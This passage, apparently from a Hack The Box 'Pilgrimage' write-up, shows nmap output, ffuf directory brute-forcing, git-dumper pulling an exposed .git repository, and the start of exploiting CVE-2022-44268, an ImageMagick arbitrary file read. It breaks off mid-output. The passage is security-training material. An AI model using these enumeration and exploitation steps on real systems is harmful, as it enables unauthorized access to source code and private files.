</span></span><span class=line><span class=cl>80/tcp open  http    syn-ack nginx/1.18.0
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: GET HEAD POST
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: nginx/1.18.0
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl><span class=c1># Nmap done at Wed Nov 22 17:06:00 2023 -- 1 IP address (1 host up) scanned in 30.92 seconds</span>
</span></span></code></pre></div><h2 id=website-at-tcp-80>Website at TCP 80<a hidden class=anchor aria-hidden=true href=#website-at-tcp-80>#</a></h2><p>While trying to enumerate the website manually, I let the subdirectory brute force run in the background. And got some valuable info from an expose .git folder.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/pilgrimage/notes]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$ffuf</span> <span class=o>-</span><span class=nx>c</span> <span class=o>-</span><span class=nx>w</span> <span class=o>/</span><span class=nx>home</span><span class=o>/</span><span class=nx>noob</span><span class=o>/</span><span class=nx>wordlists</span><span class=o>/</span><span class=nx>raft</span><span class=o>-</span><span class=nx>small</span><span class=o>-</span><span class=nx>words</span><span class=p>.</span><span class=nx>txt</span> <span class=o>-</span><span class=nx>u</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/FUZZ -ic
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=sr>/&#39;___\  /</span><span class=s1>&#39;___\           /&#39;</span><span class=nx>___</span><span class=err>\</span>       
</span></span><span class=line><span class=cl>       <span class=o>/</span><span class=err>\</span> <span class=err>\</span><span class=nx>__</span><span class=o>/</span> <span class=sr>/\ \__/</span>  <span class=nx>__</span>  <span class=nx>__</span>  <span class=o>/</span><span class=err>\</span> <span class=err>\</span><span class=nx>__</span><span class=o>/</span>       
</span></span><span class=line><span class=cl>       <span class=err>\</span> <span class=err>\</span> <span class=p>,</span><span class=nx>__</span><span class=err>\\</span> <span class=err>\</span> <span class=p>,</span><span class=nx>__</span><span class=err>\</span><span class=o>/</span><span class=err>\</span> <span class=err>\</span><span class=o>/</span><span class=err>\</span> <span class=err>\</span> <span class=err>\</span> <span class=err>\</span> <span class=p>,</span><span class=nx>__</span><span class=err>\</span>      
</span></span><span class=line><span class=cl>        <span class=err>\</span> <span class=err>\</span> <span class=err>\</span><span class=nx>_</span><span class=o>/</span> <span class=err>\</span> <span class=err>\</span> <span class=err>\</span><span class=nx>_</span><span class=o>/</span><span class=err>\</span> <span class=err>\</span> <span class=err>\</span><span class=nx>_</span><span class=err>\</span> <span class=err>\</span> <span class=err>\</span> <span class=err>\</span> <span class=err>\</span><span class=nx>_</span><span class=o>/</span>      
</span></span><span class=line><span class=cl>         <span class=err>\</span> <span class=err>\</span><span class=nx>_</span><span class=err>\</span>   <span class=err>\</span> <span class=err>\</span><span class=nx>_</span><span class=err>\</span>  <span class=err>\</span> <span class=err>\</span><span class=nx>____</span><span class=o>/</span>  <span class=err>\</span> <span class=err>\</span><span class=nx>_</span><span class=err>\</span>       
</span></span><span class=line><span class=cl>          <span class=err>\</span><span class=o>/</span><span class=nx>_</span><span class=o>/</span>    <span class=err>\</span><span class=o>/</span><span class=nx>_</span><span class=o>/</span>   <span class=err>\</span><span class=o>/</span><span class=nx>___</span><span class=o>/</span>    <span class=err>\</span><span class=o>/</span><span class=nx>_</span><span class=o>/</span>       
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       <span class=nx>v1</span><span class=mf>.4.1</span><span class=o>-</span><span class=nx>dev</span>
</span></span><span class=line><span class=cl><span class=nx>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>::</span> <span class=nx>Method</span>           <span class=o>:</span> <span class=nx>GET</span>
</span></span><span class=line><span class=cl> <span class=o>::</span> <span class=nx>URL</span>              <span class=o>:</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/FUZZ
</span></span></span><span class=line><span class=cl><span class=c1></span> <span class=o>::</span> <span class=nx>Wordlist</span>         <span class=o>:</span> <span class=nx>FUZZ</span><span class=o>:</span> <span class=err>/home/noob/wordlists/raft-small-words.txt</span>
</span></span><span class=line><span class=cl> <span class=o>::</span> <span class=nx>Follow</span> <span class=nx>redirects</span> <span class=o>:</span> <span class=kc>false</span>
</span></span><span class=line><span class=cl> <span class=o>::</span> <span class=nx>Calibration</span>      <span class=o>:</span> <span class=kc>false</span>
</span></span><span class=line><span class=cl> <span class=o>::</span> <span class=nx>Timeout</span>          <span class=o>:</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl> <span class=o>::</span> <span class=nx>Threads</span>          <span class=o>:</span> <span class=mi>40</span>
</span></span><span class=line><span class=cl> <span class=o>::</span> <span class=nx>Matcher</span>          <span class=o>:</span> <span class=nx>Response</span> <span class=nx>status</span><span class=o>:</span> <span class=mi>200</span><span class=p>,</span><span class=mi>204</span><span class=p>,</span><span class=mi>301</span><span class=p>,</span><span class=mi>302</span><span class=p>,</span><span class=mi>307</span><span class=p>,</span><span class=mi>401</span><span class=p>,</span><span class=mi>403</span><span class=p>,</span><span class=mi>405</span><span class=p>,</span><span class=mi>500</span>
</span></span><span class=line><span class=cl><span class=nx>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nx>htm</span>                    <span class=p>[</span><span class=nx>Status</span><span class=o>:</span> <span class=mi>403</span><span class=p>,</span> <span class=nx>Size</span><span class=o>:</span> <span class=mi>153</span><span class=p>,</span> <span class=nx>Words</span><span class=o>:</span> <span class=mi>3</span><span class=p>,</span> <span class=nx>Lines</span><span class=o>:</span> <span class=mi>8</span><span class=p>,</span> <span class=nx>Duration</span><span class=o>:</span> <span class=mi>69</span><span class=nx>ms</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nx>html</span>                   <span class=p>[</span><span class=nx>Status</span><span class=o>:</span> <span class=mi>403</span><span class=p>,</span> <span class=nx>Size</span><span class=o>:</span> <span class=mi>153</span><span class=p>,</span> <span class=nx>Words</span><span class=o>:</span> <span class=mi>3</span><span class=p>,</span> <span class=nx>Lines</span><span class=o>:</span> <span class=mi>8</span><span class=p>,</span> <span class=nx>Duration</span><span class=o>:</span> <span class=mi>61</span><span class=nx>ms</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nx>tmp</span>                     <span class=p>[</span><span class=nx>Status</span><span class=o>:</span> <span class=mi>301</span><span class=p>,</span> <span class=nx>Size</span><span class=o>:</span> <span class=mi>169</span><span class=p>,</span> <span class=nx>Words</span><span class=o>:</span> <span class=mi>5</span><span class=p>,</span> <span class=nx>Lines</span><span class=o>:</span> <span class=mi>8</span><span class=p>,</span> <span class=nx>Duration</span><span class=o>:</span> <span class=mi>71</span><span class=nx>ms</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nx>assets</span>                  <span class=p>[</span><span class=nx>Status</span><span class=o>:</span> <span class=mi>301</span><span class=p>,</span> <span class=nx>Size</span><span class=o>:</span> <span class=mi>169</span><span class=p>,</span> <span class=nx>Words</span><span class=o>:</span> <span class=mi>5</span><span class=p>,</span> <span class=nx>Lines</span><span class=o>:</span> <span class=mi>8</span><span class=p>,</span> <span class=nx>Duration</span><span class=o>:</span> <span class=mi>51</span><span class=nx>ms</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>.</span>                       <span class=p>[</span><span class=nx>Status</span><span class=o>:</span> <span class=mi>200</span><span class=p>,</span> <span class=nx>Size</span><span class=o>:</span> <span class=mi>7621</span><span class=p>,</span> <span class=nx>Words</span><span class=o>:</span> <span class=mi>2051</span><span class=p>,</span> <span class=nx>Lines</span><span class=o>:</span> <span class=mi>199</span><span class=p>,</span> <span class=nx>Duration</span><span class=o>:</span> <span class=mi>52</span><span class=nx>ms</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nx>htaccess</span>               <span class=p>[</span><span class=nx>Status</span><span class=o>:</span> <span class=mi>403</span><span class=p>,</span> <span class=nx>Size</span><span class=o>:</span> <span class=mi>153</span><span class=p>,</span> <span class=nx>Words</span><span class=o>:</span> <span class=mi>3</span><span class=p>,</span> <span class=nx>Lines</span><span class=o>:</span> <span class=mi>8</span><span class=p>,</span> <span class=nx>Duration</span><span class=o>:</span> <span class=mi>50</span><span class=nx>ms</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nx>vendor</span>                  <span class=p>[</span><span class=nx>Status</span><span class=o>:</span> <span class=mi>301</span><span class=p>,</span> <span class=nx>Size</span><span class=o>:</span> <span class=mi>169</span><span class=p>,</span> <span class=nx>Words</span><span class=o>:</span> <span class=mi>5</span><span class=p>,</span> <span class=nx>Lines</span><span class=o>:</span> <span class=mi>8</span><span class=p>,</span> <span class=nx>Duration</span><span class=o>:</span> <span class=mi>50</span><span class=nx>ms</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nx>git</span><span class=o>/</span><span class=nx>HEAD</span>               <span class=p>[</span><span class=nx>Status</span><span class=o>:</span> <span class=mi>200</span><span class=p>,</span> <span class=nx>Size</span><span class=o>:</span> <span class=mi>23</span><span class=p>,</span> <span class=nx>Words</span><span class=o>:</span> <span class=mi>2</span><span class=p>,</span> <span class=nx>Lines</span><span class=o>:</span> <span class=mi>2</span><span class=p>,</span> <span class=nx>Duration</span><span class=o>:</span> <span class=mi>59</span><span class=nx>ms</span><span class=p>]</span>
</span></span></code></pre></div><p>Used the tool git-dumper which automatically downloaded all the files in the <code>.git</code> directory and also gave source code from the object files.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=err>✗</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/pilgrimage/notes]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$git</span><span class=o>-</span><span class=nx>dumper</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/ dump/
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Testing</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/HEAD [200]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Testing</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/ [403]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Fetching</span> <span class=nx>common</span> <span class=nx>files</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Fetching</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.gitignore [404]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.gitignore responded with status code 404
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Fetching</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/COMMIT_EDITMSG [200]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Fetching</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/hooks/applypatch-msg.sample [200]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Fetching</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/hooks/post-commit.sample [404]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/hooks/post-commit.sample responded with status code 404
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Fetching</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/description [200]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Fetching</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/hooks/post-receive.sample [404]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/hooks/post-receive.sample responded with status code 404
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Fetching</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/hooks/commit-msg.sample [200]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Fetching</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/hooks/post-update.sample [200]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Fetching</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/hooks/pre-applypatch.sample [200]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Fetching</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/hooks/pre-rebase.sample [200]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Fetching</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/hooks/pre-receive.sample [200]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Fetching</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/index [200]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Fetching</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/hooks/update.sample [200]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Fetching</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/objects/info/packs [404]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/objects/info/packs responded with status code 404
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Fetching</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/info/exclude [200]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Fetching</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/hooks/pre-commit.sample [200]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Fetching</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/hooks/pre-push.sample [200]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Fetching</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/hooks/prepare-commit-msg.sample [200]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Finding</span> <span class=nx>refs</span><span class=o>/</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Fetching</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/FETCH_HEAD [404]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/FETCH_HEAD responded with status code 404
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Fetching</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/HEAD [200]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>Fetching</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/.git/config [200]
</span></span></span></code></pre></div><p>We can see from the files that there are login functionalities, a register, and a <code>magick</code> binary.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/pilgrimage/notes/dump]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$ll</span>
</span></span><span class=line><span class=cl><span class=nx>total</span> <span class=mi>27</span><span class=nx>M</span>
</span></span><span class=line><span class=cl><span class=nx>drwxr</span><span class=o>-</span><span class=nx>xr</span><span class=o>-</span><span class=nx>x</span> <span class=mi>1</span> <span class=nx>noob</span> <span class=nx>noob</span>   <span class=mi>68</span> <span class=nx>Nov</span> <span class=mi>22</span> <span class=mi>17</span><span class=o>:</span><span class=mi>12</span> <span class=nx>assets</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=nx>rwxr</span><span class=o>-</span><span class=nx>xr</span><span class=o>-</span><span class=nx>x</span> <span class=mi>1</span> <span class=nx>noob</span> <span class=nx>noob</span> <span class=mf>5.5</span><span class=nx>K</span> <span class=nx>Nov</span> <span class=mi>22</span> <span class=mi>17</span><span class=o>:</span><span class=mi>12</span> <span class=nx>dashboard</span><span class=p>.</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=nx>rwxr</span><span class=o>-</span><span class=nx>xr</span><span class=o>-</span><span class=nx>x</span> <span class=mi>1</span> <span class=nx>noob</span> <span class=nx>noob</span> <span class=mf>9.1</span><span class=nx>K</span> <span class=nx>Nov</span> <span class=mi>22</span> <span class=mi>17</span><span class=o>:</span><span class=mi>12</span> <span class=nx>index</span><span class=p>.</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=nx>rwxr</span><span class=o>-</span><span class=nx>xr</span><span class=o>-</span><span class=nx>x</span> <span class=mi>1</span> <span class=nx>noob</span> <span class=nx>noob</span> <span class=mf>6.7</span><span class=nx>K</span> <span class=nx>Nov</span> <span class=mi>22</span> <span class=mi>17</span><span class=o>:</span><span class=mi>12</span> <span class=nx>login</span><span class=p>.</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=nx>rwxr</span><span class=o>-</span><span class=nx>xr</span><span class=o>-</span><span class=nx>x</span> <span class=mi>1</span> <span class=nx>noob</span> <span class=nx>noob</span>   <span class=mi>98</span> <span class=nx>Nov</span> <span class=mi>22</span> <span class=mi>17</span><span class=o>:</span><span class=mi>12</span> <span class=nx>logout</span><span class=p>.</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=nx>rwxr</span><span class=o>-</span><span class=nx>xr</span><span class=o>-</span><span class=nx>x</span> <span class=mi>1</span> <span class=nx>noob</span> <span class=nx>noob</span>  <span class=mi>27</span><span class=nx>M</span> <span class=nx>Nov</span> <span class=mi>22</span> <span class=mi>17</span><span class=o>:</span><span class=mi>12</span> <span class=nx>magick</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=nx>rwxr</span><span class=o>-</span><span class=nx>xr</span><span class=o>-</span><span class=nx>x</span> <span class=mi>1</span> <span class=nx>noob</span> <span class=nx>noob</span> <span class=mf>6.7</span><span class=nx>K</span> <span class=nx>Nov</span> <span class=mi>22</span> <span class=mi>17</span><span class=o>:</span><span class=mi>12</span> <span class=nx>register</span><span class=p>.</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>drwxr</span><span class=o>-</span><span class=nx>xr</span><span class=o>-</span><span class=nx>x</span> <span class=mi>1</span> <span class=nx>noob</span> <span class=nx>noob</span>   <span class=mi>30</span> <span class=nx>Nov</span> <span class=mi>22</span> <span class=mi>17</span><span class=o>:</span><span class=mi>12</span> <span class=nx>vendor</span>
</span></span></code></pre></div><p><img alt=Untitled loading=lazy src=/posts/pilgrimage/Pilgrimage%20e11ff2958bc6407d8931fe77ab0a568f/Untitled%201.png></p><p>From manual enumeration, we got two interesting possible weak points of attack. one being the login page and another the upload functionality. After trying some basic SQLi payloads, I moved towards the upload functionality.</p><p>From the source files, we can see that <code>magick</code> binary was being used to shrink images. After checking the version of the binary, we can see that it was a vulnerable version.</p><p>The open-source ImageMagick suite enables users to create, edit, and manipulate images in various formats. A key feature is its support for multiple image types, including popular formats such as PNG, JPEG, and SVG. This lets users easily convert image formats, thus making ImageMagick a flexible solution for many image processing needs.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/pilgrimage/notes/dump]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$</span><span class=p>.</span><span class=o>/</span><span class=nx>magick</span> <span class=o>-</span><span class=nx>version</span>
</span></span><span class=line><span class=cl><span class=nx>Version</span><span class=o>:</span> <span class=nx>ImageMagick</span> <span class=mf>7.1.0</span><span class=o>-</span><span class=mi>49</span> <span class=nx>beta</span> <span class=nx>Q16</span><span class=o>-</span><span class=nx>HDRI</span> <span class=nx>x86_64</span> <span class=nx>c243c9281</span><span class=o>:</span><span class=mi>20220911</span> <span class=nx>https</span><span class=o>:</span><span class=c1>//imagemagick.org
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>Copyright</span><span class=o>:</span> <span class=p>(</span><span class=nx>C</span><span class=p>)</span> <span class=mi>1999</span> <span class=nx>ImageMagick</span> <span class=nx>Studio</span> <span class=nx>LLC</span>
</span></span><span class=line><span class=cl><span class=nx>License</span><span class=o>:</span> <span class=nx>https</span><span class=o>:</span><span class=c1>//imagemagick.org/script/license.php
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>Features</span><span class=o>:</span> <span class=nx>Cipher</span> <span class=nx>DPC</span> <span class=nx>HDRI</span> <span class=nx>OpenMP</span><span class=p>(</span><span class=mf>4.5</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=nx>Delegates</span> <span class=p>(</span><span class=nx>built</span><span class=o>-</span><span class=k>in</span><span class=p>)</span><span class=o>:</span> <span class=nx>bzlib</span> <span class=nx>djvu</span> <span class=nx>fontconfig</span> <span class=nx>freetype</span> <span class=nx>jbig</span> <span class=nx>jng</span> <span class=nx>jpeg</span> <span class=nx>lcms</span> <span class=nx>lqr</span> <span class=nx>lzma</span> <span class=nx>openexr</span> <span class=nx>png</span> <span class=nx>raqm</span> <span class=nx>tiff</span> <span class=nx>webp</span> <span class=nx>x</span> <span class=nx>xml</span> <span class=nx>zlib</span>
</span></span><span class=line><span class=cl><span class=nx>Compiler</span><span class=o>:</span> <span class=nx>gcc</span> <span class=p>(</span><span class=mf>7.5</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=cve-2022-44268-arbitrary-file-read>CVE-2022-44268 Arbitrary File Read<a hidden class=anchor aria-hidden=true href=#cve-2022-44268-arbitrary-file-read>#</a></h3><p><code>ImageMagick 7.1.0.49 beta</code> was vulnerable to arbitrary file reading. The POC was available which showed creating a malicious image file which is processed by converting command embeds to file read inside the image metadata as hex and it can be read after decoding it from the processed image files.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/pilgrimage/notes/lfi]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$wget</span> <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/shrunk/655e31b0c7351.png 
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>--</span><span class=mi>2023</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>22</span> <span class=mi>17</span><span class=o>:</span><span class=mi>24</span><span class=o>:</span><span class=mi>00</span><span class=o>--</span>  <span class=nx>http</span><span class=o>:</span><span class=c1>//pilgrimage.htb/shrunk/655e31b0c7351.png
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>Resolving</span> <span class=nx>pilgrimage</span><span class=p>.</span><span class=nx>htb</span> <span class=p>(</span><span class=nx>pilgrimage</span><span class=p>.</span><span class=nx>htb</span><span class=p>)...</span> <span class=mf>10.10.11.219</span>
</span></span><span class=line><span class=cl><span class=nx>Connecting</span> <span class=nx>to</span> <span class=nx>pilgrimage</span><span class=p>.</span><span class=nx>htb</span> <span class=p>(</span><span class=nx>pilgrimage</span><span class=p>.</span><span class=nx>htb</span><span class=p>)</span><span class=o>|</span><span class=mf>10.10.11.219</span><span class=o>|:</span><span class=mf>80.</span><span class=p>..</span> <span class=nx>connected</span><span class=p>.</span>
</span></span><span class=line><span class=cl><span class=nx>HTTP</span> <span class=nx>request</span> <span class=nx>sent</span><span class=p>,</span> <span class=nx>awaiting</span> <span class=nx>response</span><span class=p>...</span> <span class=mi>200</span> <span class=nx>OK</span>
</span></span><span class=line><span class=cl><span class=nx>Length</span><span class=o>:</span> <span class=mi>1080</span> <span class=p>(</span><span class=mf>1.1</span><span class=nx>K</span><span class=p>)</span> <span class=p>[</span><span class=nx>image</span><span class=o>/</span><span class=nx>png</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nx>Saving</span> <span class=nx>to</span><span class=o>:</span> <span class=err>‘</span><span class=mi>655</span><span class=nx>e31b0c7351</span><span class=p>.</span><span class=nx>png</span><span class=err>’</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=mi>655</span><span class=nx>e31b0c7351</span><span class=p>.</span><span class=nx>png</span>        <span class=mi>100</span><span class=o>%</span><span class=p>[</span><span class=o>================================&gt;</span><span class=p>]</span>   <span class=mf>1.05</span><span class=nx>K</span>  <span class=o>--</span><span class=p>.</span><span class=o>-</span><span class=nx>KB</span><span class=o>/</span><span class=nx>s</span>    <span class=k>in</span> <span class=mi>0</span><span class=nx>s</span>      
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=mi>2023</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>22</span> <span class=mi>17</span><span class=o>:</span><span class=mi>24</span><span class=o>:</span><span class=mi>00</span> <span class=p>(</span><span class=mf>66.9</span> <span class=nx>MB</span><span class=o>/</span><span class=nx>s</span><span class=p>)</span> <span class=o>-</span> <span class=err>‘</span><span class=mi>655</span><span class=nx>e31b0c7351</span><span class=p>.</span><span class=nx>png</span><span class=err>’</span> <span class=nx>saved</span> <span class=p>[</span><span class=mi>1080</span><span class=o>/</span><span class=mi>1080</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>┌─</span><span class=p>[</span><span class=nx>noob</span><span class=err>@</span><span class=nx>parrot</span><span class=p>]</span><span class=err>─</span><span class=p>[</span><span class=o>~</span><span class=err>/htb/pilgrimage/notes/lfi]</span>
</span></span><span class=line><span class=cl><span class=err>└──╼</span> <span class=nx>$identify</span> <span class=o>-</span><span class=nx>verbose</span> <span class=mi>655</span><span class=nx>e31b0c7351</span><span class=p>.</span><span class=nx>png</span> 
</span></span><span class=line><span class=cl><span class=nx>Image</span><span class=o>:</span> <span class=mi>655</span><span class=nx>e31b0c7351</span><span class=p>.</span><span class=nx>png</span>
</span></span><span class=line><span class=cl>  <span class=nx>Format</span><span class=o>:</span> <span class=nx>PNG</span> <span class=p>(</span><span class=nx>Portable</span> <span class=nx>Network</span> <span class=nx>Graphics</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=nx>Geometry</span><span class=o>:</span> <span class=mi>100</span><span class=nx>x100</span>
</span></span><span class=line><span class=cl>  <span class=nx>Class</span><span class=o>:</span> <span class=nx>PseudoClass</span>
</span></span><span class=line><span class=cl>  <span class=nx>Type</span><span class=o>:</span> <span class=nx>palette</span>
